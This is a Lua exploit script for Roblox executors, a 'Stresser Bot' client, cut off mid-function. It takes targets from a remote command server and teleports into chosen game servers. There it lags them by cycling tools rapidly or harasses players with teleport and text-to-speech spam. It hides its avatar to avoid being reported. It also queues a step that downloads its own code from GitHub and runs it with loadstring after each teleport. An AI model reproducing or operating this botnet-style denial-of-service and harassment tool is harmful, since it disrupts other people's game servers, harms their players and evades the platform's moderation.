-- Advanced Stresser Bot Client v3.0
-- Cloud-hosted automated bot with executor compatibility and duration tracking

-- Check if script has already been executed using a global flag
if _G.StresserBotExecuted then
    warn("Stresser Bot is already running!")
    return
end
_G.StresserBotExecuted = true

local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- TTS service
local TTS = ReplicatedStorage and ReplicatedStorage:FindFirstChild("TTS")

-- Configuration
local CONFIG = {
    API_URL = "https://stresser.onrender.com",
    BOT_ID = "BOT_" .. string.upper(string.sub(game:GetService("RbxAnalyticsService"):GetClientId(), 1, 8)),
    HEARTBEAT_INTERVAL = 5,  -- Combined heartbeat + task check every 5 seconds
    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds
    AUTO_START = true,
    SCRIPT_URL = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/bot.lua",
    TOOL_CYCLE_DELAY = 0.05  -- Very fast tool cycling for lag (NO TTS, NO TELEPORTING)
}

local player = Players.LocalPlayer

-- Setup queue teleport compatibility across executors
local queueTeleport = (syn and syn.queue_on_teleport) or
                     (fluxus and fluxus.queue_on_teleport) or
                     queue_on_teleport or
                     function() end

-- State
local botState = {
    isActive = false,
    currentTarget = nil,
    attacksExecuted = 0,
    status = "STARTING",
    startTime = tick(),
    currentDuration = 0,
    joinTime = 0,
    shouldLeave = false,
    isLagging = false,
    lagEndTime = 0,
    currentTaskId = nil,
    serverHopEnabled = false,
    teleportStartTime = 0,
    teleportRetries = 0,
    maxTeleportRetries = 3,
    teleportTimeout = 30,
    lastStatusSync = 0,
    -- Annoy server specific states
    isAnnoying = false,
    isOmnipresent = false,
    chatTimer = 0,
    currentTaskType = "attack",
    omnipresenceConnection = nil
}

-- File handling functions for executor compatibility
local function fileExists(filename)
    return pcall(function()
        readfile(filename)
    end)
end

local function createBotFolder()
    local folderName = "StresserBot"
    local statusFile = folderName .. "/status.txt"
    
    pcall(function()
        if not fileExists(folderName) then
            makefolder(folderName)
        end
        if not fileExists(statusFile) then
            writefile(statusFile, "")
        end
    end)
    return statusFile
end

local function saveBotStatus(status)
    pcall(function()
        local statusFile = createBotFolder()
        writefile(statusFile, HttpService:JSONEncode({
            botId = CONFIG.BOT_ID,
            status = status,
            lastUpdate = tick(),
            attacksExecuted = botState.attacksExecuted
        }))
    end)
end

-- Console GUI for monitoring
local function createConsole()
    local playerGui = player:WaitForChild("PlayerGui")
    
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "StresserBotConsole"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    
    -- Console Frame
    local consoleFrame = Instance.new("Frame")
    consoleFrame.Size = UDim2.new(0, 400, 0, 250)
    consoleFrame.Position = UDim2.new(0, 10, 0, 10)
    consoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    consoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
    consoleFrame.BorderSizePixel = 2
    consoleFrame.Active = true
    consoleFrame.Draggable = true
    consoleFrame.Parent = screenGui
    
    -- Console Header
    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.Position = UDim2.new(0, 0, 0, 0)
    header.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    header.BorderSizePixel = 0
    header.Text = "STRESSER BOT | ID: " .. CONFIG.BOT_ID
    header.TextColor3 = Color3.new(0, 0, 0)
    header.TextScaled = true
    header.Font = Enum.Font.GothamBold
    header.Parent = consoleFrame
    
    -- Status Bar
    local statusBar = Instance.new("TextLabel")
    statusBar.Size = UDim2.new(1, 0, 0, 25)
    statusBar.Position = UDim2.new(0, 0, 0, 30)
    statusBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    statusBar.BorderSizePixel = 0
    statusBar.Text = "STATUS: STARTING"
    statusBar.TextColor3 = Color3.fromRGB(255, 255, 0)
    statusBar.TextScaled = true
    statusBar.Font = Enum.Font.Code
    statusBar.Parent = consoleFrame
    
    -- Console Text
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -65)
    consoleText.Position = UDim2.new(0, 5, 0, 60)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
    consoleText.TextScaled = false
    consoleText.TextSize = 12
    consoleText.Font = Enum.Font.Code
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.Parent = consoleFrame
    
    return {
        screenGui = screenGui,
        consoleText = consoleText,
        statusBar = statusBar,
        header = header
    }
end

-- Console logging
local console
local consoleLines = {}
local maxLines = 15

local function log(message, logType)
    logType = logType or "INFO"
    local timestamp = os.date("%H:%M:%S")
    local logLine = "[" .. timestamp .. "] [" .. logType .. "] " .. message
    
    print(logLine)
    
    if console then
        table.insert(consoleLines, logLine)
        if #consoleLines > maxLines then
            table.remove(consoleLines, 1)
        end
        
        console.consoleText.Text = table.concat(consoleLines, "\n")
    end
end

-- API functions
local function makeRequest(endpoint, method, data)
    local success, response = pcall(function()
        local requestData = {
            Url = CONFIG.API_URL .. endpoint,
            Method = method or "GET"
        }
        
        if data then
            requestData.Headers = {["Content-Type"] = "application/json"}
            requestData.Body = HttpService:JSONEncode(data)
        end
        
        return request(requestData)
    end)
    
    return success, response
end

local function syncWithAPI()
    if not botState.isActive then return nil end
    
    local syncData = {
        botId = CONFIG.BOT_ID,
        status = botState.status,
        currentPlace = tostring(game.PlaceId),
        currentJob = game.JobId,
        attacksExecuted = botState.attacksExecuted,
        uptime = math.floor(tick() - botState.startTime)
    }
    
    local success, response = makeRequest("/bot-sync", "POST", syncData)
    
    if success and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        log("API sync successful - Status: " .. botState.status)
        saveBotStatus(botState.status)
        
        -- Check if our current attack was stopped by the API
        if (botState.status == "TELEPORTING" or botState.status == "teleporting" or botState.status == "attacking") and 
           botState.currentTaskId then
            -- Check if our task still exists and is assigned
            local taskSuccess, taskResponse = makeRequest("/get-task?botId=" .. CONFIG.BOT_ID, "GET")
            if taskSuccess and taskResponse.Success then
                local taskData = HttpService:JSONDecode(taskResponse.Body)
                -- If no task is returned or task ID doesn't match, our attack was stopped
                if not taskData.task or taskData.task.taskId ~= botState.currentTaskId then
                    log("Attack was stopped by API - resetting bot status", "SYSTEM")
                    botState.status = "online"
                    botState.currentTarget = nil
                    botState.currentTaskId = nil
                    botState.teleportRetries = 0
                    botState.teleportStartTime = 0
                    botState.isLagging = false
                    botState.lagEndTime = 0
                    saveBotStatus("online")
                    return nil
                end
            end
        end
        
        -- Return task if one was assigned
        if data.task then
            local taskType = data.task.taskType or "attack"
            local taskName = taskType == "annoy" and "Annoy Server" or "Attack"
            log("New " .. taskName .. " assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s | Server Hop: " .. tostring(data.task.serverHop or false))
            return data.task
        end
        
        return nil
    else
        log("API sync failed", "ERROR")
        return nil
    end
end

-- Server hop completion function
local function completeServerHop()
    if not botState.currentTaskId then
        log("No task ID available for server hop completion", "ERROR")
        return false
    end
    
    local hopData = {
        botId = CONFIG.BOT_ID,
        taskId = botState.currentTaskId
    }
    
    log("Completing server hop for task: " .. botState.currentTaskId, "ATTACK")
    
    local success, response = makeRequest("/server-hop-complete", "POST", hopData)
    
    if success and response.Success then
        local data = HttpService:JSONDecode(response.Body)
        if data.success then
            log("Server hop completed! Servers lagged: " .. (data.serversLagged or 0), "ATTACK")
            
            if data.newTask then
                log("Got new server hop task: " .. data.newTask.placeId, "ATTACK")
                -- Store the new task info
                botState.currentTarget = data.newTask
                botState.currentDuration = data.newTask.duration or 60
                botState.currentTaskId = data.newTask.taskId
                botState.serverHopEnabled = data.newTask.serverHop or false
                
                -- Reset teleport counters for server hop
                botState.teleportRetries = 0
                botState.teleportStartTime = 0
                
                -- Teleport to new server for infinite hopping
                wait(2)
                log("Starting server hop teleport to place: " .. data.newTask.placeId, "ATTACK")
                teleportToRandomServer(data.newTask.placeId)
                return true
            else
                log("Server hop complete, no new task - going idle", "ATTACK")
                botState.status = "online"
                botState.currentTarget = nil
                botState.currentTaskId = nil
                botState.serverHopEnabled = false
                return true
            end
        else
            log("Server hop completion failed: " .. (data.error or "Unknown error"), "ERROR")
            return false
        end
    else
        log("Server hop API request failed", "ERROR")
        return false
    end
end

local function teleportToRandomServer(placeId)
    log("Teleporting to random server for place: " .. placeId .. " (Attempt " .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
    botState.status = "teleporting"
    botState.teleportStartTime = tick()
    botState.teleportRetries = botState.teleportRetries + 1
    
    -- Queue the script to re-execute after teleport
    queueTeleport([[
        -- Re-execute the stresser bot script
        _G.StresserBotExecuted = nil
        wait(3)
        local success, script = pcall(function()
            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
        end)
        if success and script and script ~= "" then
            local loadSuccess, err = pcall(function()
                loadstring(script)()
            end)
            if not loadSuccess then
                warn("Script execution failed: " .. tostring(err))
            end
        else
            warn("Failed to download bot script for re-execution")
        end
    ]])
    
    -- Teleport to a random server of the same place
    local success, result = pcall(function()
        local placeIdNum = tonumber(placeId)
        if placeIdNum then
            log("Initiating teleport to random server of place: " .. placeIdNum, "ATTACK")
            TeleportService:Teleport(placeIdNum)
        else
            error("Invalid place ID: " .. tostring(placeId))
        end
    end)
    
    if success then
        log("Server hop teleport initiated successfully", "ATTACK")
    else
        log("Server hop teleport failed: " .. tostring(result), "ERROR")
        -- Don't immediately give up - let the retry mechanism handle it
        if botState.teleportRetries >= botState.maxTeleportRetries then
            log("Max teleport retries reached, cancelling server hop", "ERROR")
            botState.status = "online"
            botState.currentTarget = nil
            botState.currentTaskId = nil
            botState.teleportRetries = 0
            botState.teleportStartTime = 0
            botState.serverHopEnabled = false
        end
    end
end

-- Lag functionality based on lag.lua
local function copyAvatar(username)
    local maxAttempts = 3
    local attempt = 1
    while attempt <= maxAttempts do
        local success, err = pcall(function()
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Event = ReplicatedStorage:FindFirstChild("EventInputModify")
            if Event then
                Event:FireServer(username)
            else
                error("EventInputModify not found")
            end
        end)
        if success then
            wait(1)
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                return true
            else
                log("Avatar copied but character not updated on attempt " .. attempt, "WARN")
            end
        else
            log("Failed to copy avatar for " .. username .. " on attempt " .. attempt .. ": " .. tostring(err), "ERROR")
        end
        attempt = attempt + 1
        wait(1)
    end
    log("Failed to copy avatar for " .. username .. " after " .. maxAttempts .. " attempts", "ERROR")
    return false
end

local function removeTargetedItems(character)
    if not character or not character.Parent then return end
    local targetItemNames = {"aura", "fluffy satin gloves black", "fuzzy", "gloves", "satin"}
    local removedCount = 0
    
    -- More aggressive removal - check all accessories and clothing
    for _, item in ipairs(character:GetChildren()) do
        if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Clothing") then
            local itemName = item.Name:lower()
            for _, targetName in ipairs(targetItemNames) do
                if itemName:find(targetName, 1, true) then
                    pcall(function() 
                        item:Destroy() 
                        removedCount = removedCount + 1
                        log("Destroyed: " .. item.Name, "ATTACK")
                    end)
                    break
                end
            end
        end
    end
    
    -- Also check Humanoid for worn accessories
    if character:FindFirstChild("Humanoid") then
        local humanoid = character.Humanoid
        for _, item in ipairs(humanoid:GetAccessories()) do
            local itemName = item.Name:lower()
            for _, targetName in ipairs(targetItemNames) do
                if itemName:find(targetName, 1, true) then
                    pcall(function() 
                        humanoid:RemoveAccessory(item)
                        item:Destroy()
                        removedCount = removedCount + 1
                        log("Removed accessory: " .. item.Name, "ATTACK")
                    end)
                    break
                end
            end
        end
    end
    
    log("Removed " .. removedCount .. " targeted items from character", "ATTACK")
    return removedCount
end

local function copyAvatarAndGetTools(username)
    local success = copyAvatar(username)
    if not success then
        log("Proceeding with tool acquisition despite avatar copy failure for " .. username, "WARN")
    end

    -- DON'T remove items here - they should already be removed in startLagging()

    local tools = {
        "DangerCarot",
        "DangerBlowDryer",
        "DangerPistol",
        "FoodBloxi",
        "DangerSpray",
        "FoodPizza",
        "FoodChocolate"
    }
    
    spawn(function()
        for _, toolName in ipairs(tools) do
            pcall(function()
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local toolEvent = ReplicatedStorage:FindFirstChild("Tool")
                if toolEvent then
                    toolEvent:FireServer(toolName)
                end
            end)
            wait(0.1)
        end
    end)
end

local function toolCycleLoop()
    spawn(function()
        while botState.isLagging do
            local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
            local backpack = player.Backpack
            
            if humanoid and backpack then
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") and botState.isLagging then
                        humanoid:EquipTool(tool)
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                        humanoid:UnequipTools()
                        wait(CONFIG.TOOL_CYCLE_DELAY)
                    end
                end
            end
            wait(0.01)
        end
    end)
end

-- TTS function for annoy server
local function sendTTSMessage(message, voice)
    if TTS then
        local success, err = pcall(function()
            TTS:FireServer(message, voice or "9")
        end)
        if not success then
            log("TTS failed: " .. tostring(err), "ERROR")
        else
            log("TTS sent: " .. message, "ANNOY")
        end
    else
        log("TTS remote not found!", "WARNING")
    end
end

-- Ultra-fast omnipresence system - INSTANT teleportation using RunService
local function startOmnipresence()
    if botState.isOmnipresent then return end
    botState.isOmnipresent = true
    
    log("🌀 Activating omnipresence protocol - INSTANT simultaneous existence", "ANNOY")
    
    local currentPlayerIndex = 1
    
    -- Use RunService.Heartbeat for maximum speed (60+ FPS)
    botState.omnipresenceConnection = RunService.Heartbeat:Connect(function()
        if not botState.isOmnipresent or not botState.isAnnoying then
            if botState.omnipresenceConnection then
                botState.omnipresenceConnection:Disconnect()
                botState.omnipresenceConnection = nil
            end
            return
        end
        
        local allPlayers = Players:GetPlayers()
        local validPlayers = {}
        
        -- Get all valid players (excluding self)
        for _, targetPlayer in pairs(allPlayers) do
            if targetPlayer ~= player and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                table.insert(validPlayers, targetPlayer)
            end
        end
        
        if #validPlayers > 0 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            -- Cycle through players at maximum framerate speed
            local targetPlayer = validPlayers[currentPlayerIndex]
            
            pcall(function()
                -- INSTANT teleport with no delays
                local offset = Vector3.new(
                    math.random(-2, 2),
                    math.random(0, 2), 
                    math.random(-2, 2)
                )
                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position + offset
                
                -- Multiple teleportation methods for maximum effect
                player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                player.Character.HumanoidRootPart.Position = targetPosition
                player.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
            end)
            
            -- Move to next player instantly
            currentPlayerIndex = currentPlayerIndex + 1
            if currentPlayerIndex > #validPlayers then
                currentPlayerIndex = 1
            end
        end
    end)
end

local function stopOmnipresence()
    botState.isOmnipresent = false
    -- Disconnect the RunService connection
    if botState.omnipresenceConnection then
        botState.omnipresenceConnection:Disconnect()
        botState.omnipresenceConnection = nil
    end
    log("🌟 Omnipresence protocol deactivated", "ANNOY")
end

-- No teleportation or TTS for normal attacks - just pure tool cycling for lag

local function teleportToSafeLocation()
    -- Teleport to safe location where bot won't be seen or reported
    local safePosition = Vector3.new(718.295898, 910.449951, -181.603394)
    local safeLocation = CFrame.new(safePosition) -- Simple position-only CFrame to avoid rotation issues
    
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        pcall(function()
            player.Character.HumanoidRootPart.CFrame = safeLocation
            player.Character.HumanoidRootPart.Anchored = false -- Ensure not anchored
            log("Teleported to safe location for lagging", "ATTACK")
        end)
    end
end

local function startAnnoyServer()
    if botState.isAnnoying then return end
    
    botState.isAnnoying = true
    botState.status = "annoying"
    log("Starting annoy server for " .. botState.currentDuration .. " seconds", "ANNOY")
    
    -- Start omnipresence system (teleport to everyone fast)
    startOmnipresence()
    wait(1)
    
    -- Copy avatar and get tools (optional for annoy mode)
    log("Copying avatar for annoy mode...", "ANNOY")
    copyAvatarAndGetTools("24k_mxtty1")
    wait(2)
    
    -- Remove targeted items
    if player.Character then
        log("Removing targeted items for annoy mode...", "ANNOY")
        local removedCount = removeTargetedItems(player.Character)
        log("Removed " .. removedCount .. " items for annoy mode", "ANNOY")
        wait(2)
    end
    
    -- Send initial TTS message
    sendTTSMessage("yyyyyyyyyyyyyyyyyyyyyyyyy", "9")
    botState.chatTimer = tick()
    
    log("Annoy server protocol activated - teleporting to everyone and spamming TTS!", "ANNOY")
    
    -- Set annoy end time
    botState.lagEndTime = tick() + botState.currentDuration
    log("Annoy will end at: " .. botState.lagEndTime .. " (duration: " .. botState.currentDuration .. "s)", "ANNOY")
end

local function startLagging()
    if botState.isLagging then return end
    
    botState.isLagging = true
    botState.status = "lagging" -- Keep as lagging but still count as online
    log("Starting lag attack for " .. botState.currentDuration .. " seconds", "ATTACK")
    
    -- FIRST: Teleport to safe location
    teleportToSafeLocation()
    wait(1)
    
    -- SECOND: Copy avatar and get tools for lagging
    log("Copying avatar and getting tools...", "ATTACK")
    copyAvatarAndGetTools("24k_mxtty1")
    wait(2) -- Wait for avatar copy to complete and items to appear
    
    -- THIRD: Remove targeted items that appeared after avatar copy
    if player.Character then
        log("Removing targeted items that appeared after avatar copy...", "ATTACK")
        local removedCount = removeTargetedItems(player.Character)
        log("Removed " .. removedCount .. " items, waiting 2 seconds before starting lag...", "ATTACK")
        wait(2) -- Wait for items to be fully removed
    end
    
    -- Start tool cycling loop only (no teleportation or TTS)
    log("Starting tool cycling lag...", "ATTACK")
    toolCycleLoop()
    
    -- Set lag end time (this should only happen ONCE per attack)
    botState.lagEndTime = tick() + botState.currentDuration
    log("Lag will end at: " .. botState.lagEndTime .. " (duration: " .. botState.currentDuration .. "s)", "ATTACK")
end

local function stopAnnoyServer()
    if not botState.isAnnoying then return end
    
    botState.isAnnoying = false
    botState.lagEndTime = 0
    
    -- Stop omnipresence
    stopOmnipresence()
    
    log("Annoy server completed", "ANNOY")
    
    -- Unequip tools
    pcall(function()
        for _, tool in pairs(player.Backpack:GetChildren()) do
            tool:Destroy()
        end
    end)
    
    -- Check if server hopping is enabled
    if botState.serverHopEnabled then
        log("Server hop enabled - completing server hop", "ANNOY")
        botState.status = "completed"
        
        -- Call server hop completion endpoint
        local success = completeServerHop()
        if success then
            log("Server hop process initiated successfully", "ANNOY")
            return
        else
            log("Server hop failed, falling back to normal completion", "ERROR")
        end
    end
    
    -- Normal completion (no server hopping)
    log("Normal annoy completion - going idle", "ANNOY")
    botState.status = "completed"
    
    -- Send completed status to API
    syncWithAPI()
    wait(2) -- Give API time to process the completed status
    
    -- Set to idle state after API processes completion
    botState.status = "online"
    botState.currentTarget = nil
    botState.currentTaskId = nil
    botState.joinTime = 0
    
    -- Send final online status
    syncWithAPI()
    
    -- Clear status file to prevent restart loops
    saveBotStatus("online")
    
    log("Annoy server marked as completed in API, bot now idle and ready for next task", "ANNOY")
end

local function stopLagging()
    if not botState.isLagging then return end
    
    botState.isLagging = false
    botState.lagEndTime = 0
    
    log("Lag attack completed", "ATTACK")
    
    -- Unequip tools
    pcall(function()
        for _, tool in pairs(player.Backpack:GetChildren()) do
            tool:Destroy()
        end
    end)
    
    -- Check if server hopping is enabled
    if botState.serverHopEnabled then
        log("Server hop enabled - completing server hop", "ATTACK")
        botState.status = "completed"
        
        -- Call server hop completion endpoint
        local success = completeServerHop()
        if success then
            log("Server hop process initiated successfully", "ATTACK")
            -- The completeServerHop function handles teleportation
            return
        else
            log("Server hop failed, falling back to normal completion", "ERROR")
        end
    end
    
    -- Normal completion (no server hopping)
    log("Normal attack completion - going idle", "ATTACK")
    botState.status = "completed"
    
    -- Send completed status to API
    syncWithAPI()
    wait(2) -- Give API time to process the completed status
    
    -- Set to idle state after API processes completion
    botState.status = "online"
    botState.currentTarget = nil
    botState.currentTaskId = nil
    botState.joinTime = 0
    
    -- Send final online status
    syncWithAPI()
    
    -- Clear status file to prevent restart loops
    saveBotStatus("online")
    
    log("Attack marked as completed in API, bot now idle and ready for next attack", "ATTACK")
end

local function checkCurrentServer(target)
    -- Check if we're already in the target server
    local currentPlaceId = tostring(game.PlaceId)
    local currentJobId = game.JobId
    
    if currentPlaceId == target.placeId and currentJobId == target.jobId then
        botState.currentTarget = target
        botState.currentDuration = target.duration or 60
        botState.currentTaskId = target.taskId
        botState.serverHopEnabled = target.serverHop or false
        botState.currentTaskType = target.taskType or "attack"
        botState.joinTime = tick()
        
        if botState.currentTaskType == "annoy" then
            log("Already in target server! Starting annoy server immediately", "ANNOY")
            startAnnoyServer()
        else
            log("Already in target server! Starting lag immediately", "ATTACK")
            startLagging()
        end
        return true
    end
    return false
end

local function executeAttack(target)
    if not target then return end
    
    -- Check if we're already in the target server
    if checkCurrentServer(target) then
        return -- Already started lagging in current server
    end
    
    botState.currentTarget = target
    botState.currentDuration = target.duration or 60
    botState.currentTaskId = target.taskId
    botState.serverHopEnabled = target.serverHop or false
    botState.currentTaskType = target.taskType or "attack"
    botState.status = "ATTACKING"
    botState.joinTime = tick()
    botState.teleportRetries = 0  -- Reset retry counter for new attack
    botState.teleportStartTime = 0
    
    local taskName = botState.currentTaskType == "annoy" and "Annoy Server" or "Attack"
    log("Executing " .. taskName .. " on Place ID: " .. target.placeId, string.upper(botState.currentTaskType))
    log("Job ID: " .. string.sub(target.jobId, 1, 12) .. "...")
    log("Duration: " .. botState.currentDuration .. " seconds")
    
    -- Queue the script to re-execute after teleport
    queueTeleport([[
        -- Re-execute the stresser bot script
        _G.StresserBotExecuted = nil
        wait(3)
        local success, script = pcall(function()
            return game:HttpGet("]] .. CONFIG.SCRIPT_URL .. [[")
        end)
        if success and script and script ~= "" then
            local loadSuccess, err = pcall(function()
                loadstring(script)()
            end)
            if not loadSuccess then
                warn("Script execution failed: " .. tostring(err))
            end
        else
            warn("Failed to download bot script for re-execution")
        end
    ]])
    
    local success, result = pcall(function()
        if target.jobId and target.jobId ~= "random" then
            TeleportService:TeleportToPlaceInstance(tonumber(target.placeId), target.jobId)
        else
            -- For server hopping or when jobId is "random", teleport to random server
            TeleportService:Teleport(tonumber(target.placeId))
        end
    end)
    
    if success then
        botState.attacksExecuted = botState.attacksExecuted + 1
        botState.status = "TELEPORTING"
        botState.teleportStartTime = tick()
        botState.teleportRetries = 1
        log("Teleporting to target successfully!")
        log("Total attacks executed: " .. botState.attacksExecuted)
    else
        log("Teleport failed: " .. tostring(result) .. " - Will retry", "ERROR")
        botState.teleportRetries = 1
        botState.teleportStartTime = tick()
        -- Set status to teleporting so retry mechanism can handle it
        botState.status = "TELEPORTING"
    end
end

local function checkLagDuration()
    -- Check annoy server duration and TTS messages
    if botState.isAnnoying and botState.lagEndTime > 0 then
        local timeRemaining = botState.lagEndTime - tick()
        
        if console then
            console.statusBar.Text = "ANNOYING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
        end
        
        -- Send TTS message every 8 seconds
        if tick() - botState.chatTimer >= 8 then
            sendTTSMessage("yyyyyyyyyyyyyyyyyyyyyyyyy", "9")
            botState.chatTimer = tick()
        end
        
        if timeRemaining <= 0 then
            stopAnnoyServer()
        end
    end
    
    -- Check if we need to stop lagging and go idle
    if botState.isLagging and botState.lagEndTime > 0 then
        local timeRemaining = botState.lagEndTime - tick()
        
        if console then
            console.statusBar.Text = "LAGGING | TIME LEFT: " .. math.max(0, math.floor(timeRemaining)) .. "s"
        end
        
        if timeRemaining <= 0 then
            stopLagging() -- This now handles everything including API calls and status file
        end
    end
    
    -- NO RESTART LOGIC - lag should only start once per attack
end

-- Check if teleport is stuck and handle retries
local function checkTeleportStatus()
    if botState.status == "TELEPORTING" or botState.status == "teleporting" then
        local timeInTeleport = tick() - botState.teleportStartTime
        
        -- If teleport has been running for more than timeout seconds
        if timeInTeleport > botState.teleportTimeout then
            log("Teleport timeout after " .. math.floor(timeInTeleport) .. " seconds", "ERROR")
            
            -- Check if we can retry
            if botState.teleportRetries < botState.maxTeleportRetries and botState.currentTarget then
                log("Retrying teleport (" .. (botState.teleportRetries + 1) .. "/" .. botState.maxTeleportRetries .. ")", "ATTACK")
                
                -- Reset teleport start time and try again
                botState.teleportStartTime = tick()
                botState.teleportRetries = botState.teleportRetries + 1
                
                -- Try teleporting again
                local success, result = pcall(function()
                    if botState.currentTarget.jobId and botState.currentTarget.jobId ~= "random" then
                        TeleportService:TeleportToPlaceInstance(tonumber(botState.currentTarget.placeId), botState.currentTarget.jobId)
                    else
                        TeleportService:Teleport(tonumber(botState.currentTarget.placeId))
                    end
                end)
                
                if not success then
                    log("Teleport retry failed: " .. tostring(result), "ERROR")
                end
            else
                log("Max teleport retries reached or no target - resetting to online", "ERROR")
                botState.status = "online"
                botState.currentTarget = nil
                botState.currentTaskId = nil
                botState.teleportRetries = 0
                botState.teleportStartTime = 0
                -- Sync the reset status
                syncWithAPI()
            end
        end
    end
end

-- Main loop - combines heartbeat and task polling into single API call
local function mainLoop()
    while botState.isActive do
        -- Always check teleport status first
        checkTeleportStatus()
        
        if botState.status == "online" then
            -- Sync with API - sends heartbeat and gets new task if available
            local target = syncWithAPI()
            if target then
                executeAttack(target)
            else
                log("No targets available, waiting...")
            end
        elseif botState.status == "lagging" or botState.status == "annoying" then
            -- Only check duration when lagging/annoying, don't sync with API
            checkLagDuration()
        elseif botState.status == "attacking" or botState.status == "teleporting" or botState.status == "TELEPORTING" then
            -- Just sync status, don't look for new tasks
            -- Only sync every 10 seconds to avoid spam when teleporting
            if tick() - botState.lastStatusSync > 10 then
                syncWithAPI()
                botState.lastStatusSync = tick()
            end
        else
            -- For other statuses (completed, etc), sync and check lag duration
            syncWithAPI()
            checkLagDuration()
        end
        
        wait(CONFIG.HEARTBEAT_INTERVAL) -- Now 5 seconds for everything
    end
end

local function statusUpdateLoop()
    while console.screenGui.Parent do
        if botState.isActive then
            local uptime = math.floor(tick() - botState.startTime)
            local minutes = math.floor(uptime / 60)
            local seconds = uptime % 60
            
            if not botState.shouldLeave and botState.status ~= "IN_SERVER" then
                local statusLine = "Uptime: " .. minutes .. "m " .. seconds .. "s | Attacks: " .. botState.attacksExecuted
                console.header.Text = "STRESSER BOT | " .. statusLine
                console.statusBar.Text = "STATUS: " .. botState.status
            end
            
            -- Update status bar color based on status
            if botState.status == "ONLINE" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ATTACKING" or botState.status == "IN_SERVER" or botState.status == "annoying" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            elseif botState.status == "ERROR" then
                console.statusBar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                console.statusBar.TextColor3 = Color3.fromRGB(255, 255, 255)
            end
        end
        wait(1)
    end
end

-- Auto-start function
local function startBot()
    if botState.isActive then return end
    
    botState.isActive = true
    botState.status = "online"
    botState.startTime = tick()
    
    log("Bot started successfully", "SYSTEM")
    
    -- Start single main loop (combines heartbeat + task polling)
    spawn(mainLoop)
    
    -- Check if we're in a target server (after teleport)
    if botState.currentTarget and botState.joinTime > 0 then
        botState.status = "in_server"
        log("Resumed in target server", "ATTACK")
    end
end

-- Check if we were teleported here by another instance
local function checkIfInTargetServer()
    -- Try to read bot status from file
    local success, statusData = pcall(function()
        local statusFile = createBotFolder()
        return readfile(statusFile)
    end)
    
    if success and statusData ~= "" then
        local data = HttpService:JSONDecode(statusData)
        if data and data.botId == CONFIG.BOT_ID then
            log("Found previous bot session data: " .. data.status, "SYSTEM")
            botState.attacksExecuted = data.attacksExecuted or 0
            
            -- ONLY restart if status is ATTACKING, not COMPLETED or ONLINE
            if tostring(game.PlaceId) ~= "0" and data.status == "ATTACKING" then
                log("Detected teleport to target server", "ATTACK")
                botState.status = "IN_SERVER"
                botState.joinTime = tick()
                botState.currentDuration = 60 -- Default, will be updated from server
                return true
            elseif data.status == "COMPLETED" or data.status == "ONLINE" then
                log("Bot was already completed/idle, not restarting attack", "SYSTEM")
                botState.status = "ONLINE"
                return false
            end
        end
    end
    return false
end

-- Initialize
console = createConsole()

log("Advanced Stresser Bot v3.0", "SYSTEM")
log("Initializing cloud-hosted bot...")
log("Bot ID: " .. CONFIG.BOT_ID)

-- Check if we're in a target server first
local inTargetServer = checkIfInTargetServer()

-- Test connection and auto-start
spawn(function()
    wait(2)
    log("Testing API connection...")
    
    local success, response = makeRequest("/health", "GET")
    
    if success and response.Success then
        log("API connection successful", "SYSTEM")
        if CONFIG.AUTO_START then
            wait(1)
            startBot()
            
            if inTargetServer then
                log("Resuming attack in target server", "ATTACK")
            end
        else
            log("Manual start mode - execute _G.StresserBot.start() to begin")
        end
    else
        log("Cannot connect to API", "ERROR")
        log("Check your internet connection")
    end
end)

-- Start status update loop
spawn(statusUpdateLoop)

log("Bot ready - Waiting for API connection...")

-- Expose functions for manual control
_G.StresserBot = {
    start = startBot,
    stop = function()
        if botState.isActive then
            botState.isActive = false
            botState.status = "OFFLINE"
            botState.currentTarget = nil
            botState.currentTaskId = nil
            botState.teleportRetries = 0
            botState.teleportStartTime = 0
            botState.isLagging = false
            botState.lagEndTime = 0
            log("Bot stopped manually", "SYSTEM")
            saveBotStatus("OFFLINE")
        end
    end,
    reset = function()
        log("Resetting bot status to recover from stuck state", "SYSTEM")
        botState.status = "online"
        botState.currentTarget = nil
